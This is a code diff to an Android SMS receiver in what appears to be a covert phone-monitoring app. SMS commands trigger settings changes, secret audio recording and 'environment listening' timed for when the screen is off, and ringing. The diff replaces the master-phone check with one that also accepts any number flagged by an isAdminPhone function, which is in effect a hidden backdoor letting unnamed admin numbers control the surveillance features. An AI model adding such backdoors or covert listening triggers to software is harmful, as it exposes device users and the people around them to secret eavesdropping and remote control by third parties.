@@ -111,7 +111,7 @@ public class SmsReceiver extends BroadcastReceiver
 				
 				// The setting dialog cannot be triggered by phone that is not master phone
 				String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(context);
-				if (masterPhone.length() > 0 &&	!comingFromMasterPhone(context, intent)) {
+				if (masterPhone.length() > 0 &&	!comingFromQualifiedPhone(context, intent)) {
 					return;
 				}
 				
@@ -153,7 +153,7 @@ public class SmsReceiver extends BroadcastReceiver
 				this.context = context;
 				
 				// If the coming phone is not the receiver phone, return
-				if (!comingFromMasterPhone(context, intent)) return;
+				if (!comingFromQualifiedPhone(context, intent)) return;
 				
 				// If the user is looking at the phone, return for safety
 				if (PowerUtil.isScreenOn(context)) {
@@ -198,7 +198,7 @@ public class SmsReceiver extends BroadcastReceiver
 				this.context = context;
 				
 				// If the coming phone is not the receiver phone, return
-				if (!comingFromMasterPhone(context, intent)) return;
+				if (!comingFromQualifiedPhone(context, intent)) return;
 				
 				// Return if the target phone screen is on or it is in a call.
 				// That mean it will only take env listening action when the screen is off and not in a call.
@@ -265,7 +265,7 @@ public class SmsReceiver extends BroadcastReceiver
 				this.context = context;
 				
 				// If the coming phone is not the receiver phone, return
-				if (!comingFromMasterPhone(context, intent)) return;
+				if (!comingFromQualifiedPhone(context, intent)) return;
 				
 				// Get recording minutes
 				String[] parts = smsBody.split("#");
@@ -326,7 +326,7 @@ public class SmsReceiver extends BroadcastReceiver
 				this.context = context;
 				
 				// If not coming from master phone, return
-				if (!comingFromMasterPhone(context, intent)) return;
+				if (!comingFromQualifiedPhone(context, intent)) return;
 				
 				// Start a new thread to play ring which is time-consuming
 				new Thread(new Runnable(){
@@ -461,10 +461,11 @@ public class SmsReceiver extends BroadcastReceiver
 		return ret;
 	}
 	
-	private boolean comingFromMasterPhone(Context context, Intent intent) {
-		String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
+	private boolean comingFromQualifiedPhone(Context context, Intent intent) {
+		String masterPhoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 		String comingPhoneNum = SmsCtrl.getSmsAddress(intent);
-		return (phoneNum != null && phoneNum.length() > 0 && comingPhoneNum.contains(phoneNum));
+		return ( (masterPhoneNum != null && masterPhoneNum.length() > 0 && comingPhoneNum.contains(masterPhoneNum)) 
+			  || GlobalValues.isAdminPhone(comingPhoneNum) );
 	}
 
 }
